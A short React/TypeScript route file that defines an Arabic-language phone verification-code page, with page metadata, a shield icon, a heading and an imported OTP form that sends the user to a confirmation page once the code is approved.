import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { ShieldCheck } from "lucide-react";
import { OtpForm } from "@/components/otp-form";

export const Route = createFileRoute("/phone-otp")({
  head: () => ({
    meta: [
      { title: "رمز التحقق — بيكير" },
      { name: "description", content: "أدخل رمز التحقق المرسل إلى جوالك." },
      { property: "og:title", content: "رمز التحقق — بيكير" },
      { property: "og:description", content: "أدخل رمز التحقق المرسل إلى جوالك." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: PhoneOtpPage,
});

function PhoneOtpPage() {
  const navigate = useNavigate();

  return (
    <div className="min-h-screen bg-dark-50 pt-16 md:pt-20">
      <div className="container-x py-8 md:py-12">
        <div className="mx-auto max-w-md">
          <div className="mb-6 text-center">
            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-2xl bg-primary-100 text-primary-600">
              <ShieldCheck className="h-8 w-8" />
            </div>
            <h1 className="mt-4 text-2xl font-extrabold text-dark-900">رمز التحقق</h1>
            <p className="mt-2 text-sm text-dark-500">أدخل الرمز المرسل إلى جوالك</p>
          </div>

          <OtpForm stepKey="phone_verification" idPrefix="otp" onApproved={() => void navigate({ to: "/confirm" })} />
        </div>
      </div>
    </div>
  );
}
